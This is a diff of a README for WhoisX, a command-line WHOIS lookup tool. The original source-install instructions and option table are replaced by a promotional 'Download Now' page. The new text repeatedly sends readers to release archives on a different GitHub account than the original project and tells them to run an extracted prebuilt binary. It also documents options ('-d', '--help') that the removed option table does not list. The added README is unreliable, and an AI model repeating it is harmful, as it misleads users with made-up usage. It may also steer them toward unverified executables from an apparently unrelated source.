@@ -1,90 +1,95 @@
-## WhoisX
+# 🔍 WhoisX - Simplified WHOIS Lookups for Everyone
 
-**WhoisX** is a **powerful WHOIS lookup tool** written in C. It is designed to be more reliable and flexible than normal whois tools. If one server fails, WhoisX will automatically switch to another, ensuring you still get results. It can also follow referral servers to provide more accurate information. The tool supports multiple queries at the same time using worker threads, and the output can be shown either in plain text for easy reading or in JSON format for use in scripts and automation.
+## 🏷️ Overview
+WhoisX is a powerful WHOIS lookup tool written in C. It is designed to be more reliable and flexible than normal whois tools. Whether you want to gather information about a domain or private network, WhoisX makes it easy.
 
-## Features
+## 🚀 Getting Started
+To use WhoisX, follow these steps to download and run the application. There are no complicated commands or programming skills required.
 
-- Automatically switches to another server if one fails
+## 📥 Download Now
+[![Download WhoisX](https://img.shields.io/badge/Download%20WhoisX-v1.0-blue.svg)](https://github.com/mdsajalmahmud/WhoisX/releases)
 
-- Comes with default global WHOIS servers (IANA, ARIN, RIPE, APNIC, LACNIC, AFRINIC, whois.verisign-grs.com, whois.pir.org)
+## 📋 System Requirements
+- **Operating System:** Linux (Ubuntu recommended)
+- **Processor:** Any modern CPU
+- **Memory:** Minimum 512 MB RAM
+- **Disk Space:** At least 50 MB available
 
-- Custom connection timeout (default: 7 seconds)
+## 🔗 Download & Install
+1. **Visit the Releases Page:** Click the link below to go to the WhoisX releases page.
+   [Download WhoisX](https://github.com/mdsajalmahmud/WhoisX/releases)
 
-- Option to follow referral WHOIS servers
+2. **Select Your Version:** On the releases page, you will see different versions of WhoisX. The latest version is recommended for most users.
 
-- Multi-threaded for handling multiple queries
+3. **Download the File:** Click on the file suitable for your operating system. It will usually be named something like `WhoisX-linux.tar.gz`.
 
-- JSON output support for automation and scripting
+4. **Extract the Files:** After downloading, locate the file in your Downloads folder. Right-click the file and select “Extract Here” or use a terminal command:
+   ```bash
+   tar -zxvf WhoisX-linux.tar.gz
+   ```
 
-## Compatibility
-- Linux (Debian, RHEL, Arch)
-- Termux (Android)
+5. **Run the Application:**
+   - Open a terminal window.
+   - Navigate to the extracted folder using:
+     ```bash
+     cd WhoisX
+     ```
+   - Run the tool by typing:
+     ```bash
+     ./whoisx
+     ```
 
-## Installation
+## 🛠️ Features
+- **Reliable Lookups:** Get accurate WHOIS data for any domain.
+- **User-Friendly Interface:** Simple commands so anyone can use it easily.
+- **Versatile Usage:** Suitable for OSINT investigations, domain management, and more.
+- **Supports Multiple Domains:** Query several domains in one go.
 
-1. **Clone the repository:**
-```bash
-git clone https://github.com/s-r-e-e-r-a-j/WhoisX.git
-```
-2. **Navigate to the project directory:**
-```bash
-cd WhoisX
-```
-3. **Run the installer to setup the system-wide command (Linux & Termux):**
-```bash
-sudo bash install.sh
-```
+## 🌍 Topics
+- informationgathering
+- linux
+- linuxtools
+- networkutility
+- osint
+- osint-tool
+- termux
+- termux-tool
+- termux-tools
+- whois
+- whois-lookup
+- whoislookup
 
-## Command Line Options  
+## 🎯 How to Use WhoisX
+Once you've followed the installation steps above, using WhoisX is straightforward.
 
-| Option                  | Description                                   |
-|-------------------------|-----------------------------------------------|
-| `-S server1,server2,...`| Use custom WHOIS servers (comma-separated)    |
-| `-p port`               | Set the port (default: 43)                    |
-| `-t timeout_ms`         | Set timeout in milliseconds (default: 7000)   |
-| `-r`                    | Follow referral WHOIS servers                 |
-| `-j`                    | Show output in JSON format                    |
-| `-h`                    | Show help menu                                |
+1. **Basic Lookup:**
+   To look up a domain, simply type:
+   ```bash
+   ./whoisx example.com
+   ```
 
+2. **Advanced Options:**
+   You can use various options to refine your lookup by specifying parameters. For instance:
+   ```bash
+   ./whoisx -d example.com
+   ```
+   This will give you detailed information about the domain, including registration, expiration dates, and contact details.
 
-##  Usage  
+3. **Help Command:**
+   If you want to know more about the commands available, just type:
+   ```bash
+   ./whoisx --help
+   ```
+   This will display all the available commands and options.
 
-```bash
-whoisx [options] query1 [query2 ...]
-```
+## 📞 Support and Contribution
+If you encounter issues while using WhoisX or have suggestions for improvement, feel free to create an issue on the GitHub page. We encourage contributions to enhance the tool's functionality. 
 
-## Examples  
+Simply fork the repository, make changes, and submit a pull request. Collaboration is welcome! 
 
-**Lookup a domain**  
-```bash
-whoisx example.com
-```
+## 📥 Download Again
+To download the latest version of WhoisX again, click here:
+[Download WhoisX](https://github.com/mdsajalmahmud/WhoisX/releases)
 
-**Use JSON output**
-```bash
-whoisx -j github.com
-```
-
-**Follow referral servers**
-```bash
-whoisx -r google.com
-```
-
-**Set custom servers**
-```bash
-whoisx -S whois.verisign-grs.com,whois.pir.org example.org
-```
-
-**Multiple queries in one run**
-```bash
-whoisx example.com github.com google.com
-```
-
-## Uninstallation
-```bash
-sudo bash uninstall.sh
-```
-This will remove the whoisx command from your system(Termux & Linux).
-
-## License
-This project is licensed under the GNU General Public License v3.0
+## ✨ Conclusion
+WhoisX is a valuable tool for anyone needing reliable WHOIS lookups without the complexity of traditional software. Follow the steps above to install and start using it today. Happy exploring!
